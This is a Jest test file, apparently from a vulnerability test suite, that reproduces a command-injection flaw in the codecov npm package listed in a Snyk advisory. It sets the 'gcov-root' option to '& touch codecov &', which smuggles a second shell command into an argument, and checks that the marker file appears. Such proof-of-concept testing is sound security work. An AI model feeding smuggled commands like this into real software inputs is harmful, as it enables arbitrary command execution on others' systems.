//https://snyk.io/vuln/SNYK-JS-CODECOV-548879
test("Command Injection in codecov", async () => {
  expect.assertions(2);
  const root = require("codecov");
  const fs = require("fs");
  const path = "./codecov";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      "gcov-root": "& touch codecov &",
      "gcov-exec": " ",
      "gcov-args": " ",
    },
  };
  try {
    await root.handleInput.upload(
      args,
      function () {
        console.log("success");
      },
      function () {
        console.log("Fail!");
      }
    );
  } catch (error) {
    // console.log(error);
  }
  // console.log('HEREEEEEE');
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});

  // return root.handleInput.upload(args, function () {}, function () {})
  //     .then(()=>{})
  //     .catch(err=>{
  //         console.log("here!");
  //         console.log(err);
  //     })
  //     .finally(()=>{
  //         file_exist = fs.existsSync(path);
  //         expect(file_exist).toBe(true);
  //     })
});
